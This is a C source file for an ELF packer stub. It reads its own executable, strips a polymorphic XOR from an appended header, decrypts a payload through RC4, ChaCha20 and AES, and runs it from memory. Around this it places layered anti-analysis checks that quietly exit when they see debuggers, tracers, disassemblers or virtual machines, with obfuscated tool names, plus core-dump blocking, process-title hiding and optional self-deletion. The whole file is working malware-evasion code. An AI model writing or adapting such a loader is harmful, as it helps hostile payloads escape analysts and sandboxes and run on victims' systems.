#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <time.h>
#include <errno.h>
#include "common.h"
#include "elf64.h"
#include "crypto.h"

static const struct { size_t off; size_t len; } tool_names[] = {
    { STR_OFF_GDB,     STR_LEN_GDB     },
    { STR_OFF_STRACE,  STR_LEN_STRACE  },
    { STR_OFF_LTRACE,  STR_LEN_LTRACE  },
    { STR_OFF_RADARE2, STR_LEN_RADARE2 },
    { STR_OFF_OBJDUMP, STR_LEN_OBJDUMP },
    { STR_OFF_HEXDUMP, STR_LEN_HEXDUMP },
    { STR_OFF_GHIDRA,  STR_LEN_GHIDRA  },
};

static const struct { size_t off; size_t len; } hyper_names[] = {
    { STR_OFF_HYPERVISOR, STR_LEN_HYPERVISOR },
    { STR_OFF_QEMU,       STR_LEN_QEMU       },
    { STR_OFF_KVM,        STR_LEN_KVM        },
    { STR_OFF_XEN,        STR_LEN_XEN        },
    { STR_OFF_VMWARE,     STR_LEN_VMWARE     },
    { STR_OFF_VIRTUALBOX, STR_LEN_VIRTUALBOX },
};

static const struct { size_t off; size_t len; } env_names[] = {
    { STR_OFF_LD_PRELOAD,   STR_LEN_LD_PRELOAD   },
    { STR_OFF_GDB_ENV,      STR_LEN_GDB_ENV      },
    { STR_OFF_PTRACE_SCOPE, STR_LEN_PTRACE_SCOPE },
    { STR_OFF_STRACE_LOG,   STR_LEN_STRACE_LOG   },
    { STR_OFF_LTRACE_LOG,   STR_LEN_LTRACE_LOG   },
    { STR_OFF_RADARE2_LOG,  STR_LEN_RADARE2_LOG  },
};

int detect_ptrace(void) {
    pid_t child = fork();
    if (child == 0) { 
        if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) < 0) {
            exit(1);
        }
        exit(0); 
    } else if (child > 0) {
        int status;
        waitpid(child, &status, 0);
        return WEXITSTATUS(status) != 0;
    }
    return 0;
}

int check_proc_status(void) {
    FILE* status_file = fopen("/proc/self/status", "r");
    if (!status_file) return 0;

    char tracer_prefix[16];
    deobf_str_xor(tracer_prefix,
                  (const uint8_t*)g_obf_str_block + STR_OFF_TRACERPID,
                  STR_LEN_TRACERPID, (uint8_t)g_str_xor_key);
    tracer_prefix[STR_LEN_TRACERPID] = '\0';

    char line[256];
    while (fgets(line, sizeof(line), status_file)) {
        if (strncmp(line, tracer_prefix, STR_LEN_TRACERPID) == 0) {
            int tracer_pid = atoi(line + STR_LEN_TRACERPID);
            fclose(status_file);
            secure_memory_wipe(tracer_prefix, sizeof(tracer_prefix));
            return tracer_pid != 0;
        }
    }
    fclose(status_file);
    secure_memory_wipe(tracer_prefix, sizeof(tracer_prefix));
    return 0;
}

int check_parent_process(void) {
    FILE* stat_file = fopen("/proc/self/stat", "r");
    if (!stat_file) return 0;

    pid_t ppid;
    if (fscanf(stat_file, "%*d %*s %*c %d", &ppid) != 1) {
        fclose(stat_file);
        return 0;
    }
    fclose(stat_file);

    char comm_path[64];
    snprintf(comm_path, sizeof(comm_path), "/proc/%d/comm", ppid);

    FILE* comm_file = fopen(comm_path, "r");
    if (comm_file) {
        char parent_name[64];
        if (fgets(parent_name, sizeof(parent_name), comm_file)) {
            fclose(comm_file);

            parent_name[strcspn(parent_name, "\n")] = 0;

            char decoded[16];
            for (size_t i = 0; i < sizeof(tool_names) / sizeof(tool_names[0]); i++) {
                size_t len = tool_names[i].len;
                if (len >= sizeof(decoded)) continue;
                deobf_str_xor(decoded,
                              (const uint8_t*)g_obf_str_block + tool_names[i].off,
                              len, (uint8_t)g_str_xor_key);
                decoded[len] = '\0';
                if (strcmp(parent_name, decoded) == 0) {
                    secure_memory_wipe(decoded, sizeof(decoded));
                    return 1;
                }
            }
            secure_memory_wipe(decoded, sizeof(decoded));
        } else {
            fclose(comm_file);
        }
    }
    return 0;
}


int detect_virtualization(void) {
    FILE* cpuinfo = fopen("/proc/cpuinfo", "r");
    if (!cpuinfo) return 0;

    char decoded[16];
    char line[256];
    while (fgets(line, sizeof(line), cpuinfo)) {
        for (char* p = line; *p; p++) {
            if (*p >= 'A' && *p <= 'Z') *p += 32;
        }

        for (size_t i = 0; i < sizeof(hyper_names) / sizeof(hyper_names[0]); i++) {
            size_t len = hyper_names[i].len;
            if (len >= sizeof(decoded)) continue;
            deobf_str_xor(decoded,
                          (const uint8_t*)g_obf_str_block + hyper_names[i].off,
                          len, (uint8_t)g_str_xor_key);
            decoded[len] = '\0';
            if (strstr(line, decoded)) {
                fclose(cpuinfo);
                secure_memory_wipe(decoded, sizeof(decoded));
                return 1;
            }
        }
    }
    fclose(cpuinfo);
    secure_memory_wipe(decoded, sizeof(decoded));

    /* /proc paths kept in plaintext: these are generic kernel paths that
     * appear in countless system binaries; encoding them buys little. */
    if (access("/proc/xen", F_OK) == 0) return 1;
    if (access("/sys/hypervisor/type", F_OK) == 0) return 1;
    if (access("/proc/vz", F_OK) == 0) return 1;
    if (access("/proc/bc", F_OK) == 0) return 1;

    return 0;
}

int check_debug_environment(void) {
    char decoded[16];
    int found = 0;
    for (size_t i = 0; i < sizeof(env_names) / sizeof(env_names[0]); i++) {
        size_t len = env_names[i].len;
        if (len >= sizeof(decoded)) continue;
        deobf_str_xor(decoded,
                      (const uint8_t*)g_obf_str_block + env_names[i].off,
                      len, (uint8_t)g_str_xor_key);
        decoded[len] = '\0';
        if (getenv(decoded)) { found = 1; break; }
    }
    secure_memory_wipe(decoded, sizeof(decoded));
    return found;
}

int comprehensive_anti_debug_check() {

    // This logic can be expanded
    if (detect_ptrace()) {
        return 1;
    }
    if (check_proc_status()) {
        return 1;
    }
    if (check_parent_process()) {
        return 1;
    }
    if (detect_virtualization()) {
        return 1;
    }
    if (check_debug_environment()) {
        return 1;
    }

    return 0;
}


int multi_layer_decrypt(uint8_t* data, size_t len, const pack_header_t* header) {
    rc4_encrypt_decrypt(header->tertiary_key, 32, data, data, len);
    if (chacha20_decrypt(data, len, header->secondary_key, header->nonce) != 0)
        return -1;

    if (aes256_decrypt(data, len, header->primary_key) != 0)
        return -1;
    return 0;
}

pack_header_t* find_packed_header(const uint8_t* data, size_t data_size) {
    if (data_size < sizeof(pack_header_t)) {
        return NULL;
    }

    uint32_t needle = g_packed_magic;
    for (size_t i = data_size - sizeof(pack_header_t); i > 0; i--) {
        pack_header_t* header = (pack_header_t*)(data + i);
        if (header->magic == needle) {
            return header;
        }
    }
    return NULL;
}

static void maybe_self_delete(const char* self_path) {
#ifdef HARMLESS_SELF_DELETE
    if (self_path && self_path[0] != '\0') {
        if (unlink(self_path) < 0) {
            DBG("self-delete failed\n");
        }
    }
#else
    (void)self_path;
#endif
}

int main(int argc, char* argv[], char* envp[]) {
    FILE* self_fp;
    uint8_t* self_data;
    size_t self_size;
    pack_header_t* header;
    uint8_t* encrypted_data;
    uint8_t* decrypted_data;
    uint32_t calculated_crc;

    prevent_core_dumps();
    hide_process_title(argc, argv);

    noise_delay(150);

    self_fp = fopen("/proc/self/exe", "rb");
    if (!self_fp) {
        return 1;
    }

    if (fseek(self_fp, 0, SEEK_END) != 0) {
        fclose(self_fp);
        return 1;
    }
    long self_size_long = ftell(self_fp);
    if (self_size_long <= 0) {
        fclose(self_fp);
        return 1;
    }
    self_size = (size_t)self_size_long;
    if (fseek(self_fp, 0, SEEK_SET) != 0) {
        fclose(self_fp);
        return 1;
    }

    if (self_size == 0 || self_size > SIZE_MAX / 2) {
        fclose(self_fp);
        return 1;
    }

    self_data = malloc(self_size);
    if (!self_data) {
        fclose(self_fp);
        return 1;
    }

    size_t bytes_read = fread(self_data, 1, self_size, self_fp);
    if (bytes_read != self_size) {
        secure_memory_wipe(self_data, self_size);
        free(self_data);
        fclose(self_fp);
        return 1;
    }
    fclose(self_fp);

    maybe_self_delete(argc > 0 ? argv[0] : NULL);

    header = find_packed_header(self_data, self_size);
    if (!header) {
        DBG("packed header not found\n");
        secure_memory_wipe(self_data, self_size);
        free(self_data);
        return 1;
    }
    DBG("packed header found\n");

    {
        uint8_t* hb = (uint8_t*)header;
        size_t   hdr_body = sizeof(pack_header_t) - sizeof(uint32_t);
        for (size_t i = 0; i < hdr_body; i++)
            hb[sizeof(uint32_t) + i] ^= g_pack_polymorph[i];
    }

    if (comprehensive_anti_debug_check()) {
        DBG("anti-debug pre-decrypt triggered\n");
        secure_memory_wipe(self_data, self_size);
        free(self_data);
        exit(0);
    }

    encrypted_data = (uint8_t*)header + sizeof(pack_header_t);
    size_t payload_offset = (size_t)(encrypted_data - self_data);
    if (payload_offset > self_size ||
        header->original_size > header->packed_size ||
        (size_t)header->packed_size > self_size - payload_offset) {
        DBG("packed payload out of bounds\n");
        secure_memory_wipe(self_data, self_size);
        free(self_data);
        return 1;
    }
    decrypted_data = malloc(header->original_size);
    if (!decrypted_data) {
        DBG("decrypted allocation failed\n");
        secure_memory_wipe(self_data, self_size);
        free(self_data);
        return 1;
    }

    memcpy(decrypted_data, encrypted_data, header->original_size);

    if (multi_layer_decrypt(decrypted_data, header->original_size, header) != 0) {
        DBG("decryption failed\n");
        secure_memory_wipe(decrypted_data, header->original_size);
        secure_memory_wipe(self_data, self_size);
        free(decrypted_data);
        free(self_data);
        return 1;
    }
    calculated_crc = crc32(decrypted_data, header->original_size);
    if (calculated_crc != header->crc32) {
        DBG("crc check failed\n");
        secure_memory_wipe(decrypted_data, header->original_size);
        secure_memory_wipe(self_data, self_size);
        free(decrypted_data);
        free(self_data);
        return 1;
    }
    if (!is_target_elf(decrypted_data)) {
        DBG("target ELF check failed\n");
        secure_memory_wipe(decrypted_data, header->original_size);
        secure_memory_wipe(self_data, self_size);
        free(decrypted_data);
        free(self_data);
        return 1;
    } 
    if (comprehensive_anti_debug_check()) {
        DBG("anti-debug post-decrypt triggered\n");
        secure_memory_wipe(decrypted_data, header->original_size);
        secure_memory_wipe(self_data, self_size);
        free(decrypted_data);
        free(self_data);
        exit(0);
    }
    DBG("executing payload from memory\n");
    if (execute_from_memory(decrypted_data, header->original_size, argv, envp) < 0) {
        DBG("execute_from_memory failed\n");
        secure_memory_wipe(decrypted_data, header->original_size);
        secure_memory_wipe(self_data, self_size);
        free(decrypted_data);
        free(self_data);
        return 1;
    }

    secure_memory_wipe(decrypted_data, header->original_size);
    secure_memory_wipe(self_data, self_size);
    free(decrypted_data);
    free(self_data);

    return 0;
}
